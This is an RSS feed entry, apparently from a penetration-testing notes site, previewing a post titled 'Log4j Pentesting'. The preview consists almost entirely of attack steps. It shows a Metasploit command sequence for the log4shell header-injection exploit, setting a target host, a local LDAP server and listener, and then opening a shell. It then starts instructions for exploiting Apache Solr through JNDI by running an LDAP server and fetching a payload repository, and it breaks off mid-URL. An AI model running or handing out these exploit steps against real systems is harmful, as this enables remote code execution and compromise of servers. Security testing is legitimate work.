channel.title: Apache on D0CUM3NTN4T10N
channel.description: Recent content in Apache on D0CUM3NTN4T10N

item.title: Log4j Pentesting
item.description: msfconsole msf> use exploit/multi/http/log4shell_header_injection msf> set HTTP_HEADER ACCEPT msf> set RHOSTS <target-ip> msf> set SRVHOST <local-ip> msf> set SRVPORT 1389 # e.g. Nagios msf> set TARGETURI /~logs msf> set LHOST <local-ip> msf> run shell Exploit Apache Solr (JNDI) linkYou need to prepare your four local terminals. 1. Start LDAP Server on Your Local Terminal 1 link Install Maven sudo apt install maven Get the Payload Download the repository. git clone https://github.
